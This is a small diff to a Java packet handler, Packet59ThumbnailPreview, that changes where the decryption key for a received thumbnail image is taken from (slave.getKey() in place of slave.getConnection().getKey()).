@@ -30,7 +30,7 @@ public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
 		byte[] buffer = new byte[imageSize];
 		slave.getDataInputStream().readFully(buffer);
 
-		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
+		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getKey());
 
 		if (frame != null) {
 			BufferedImage img = ImageUtils.decodeImage(buffer);
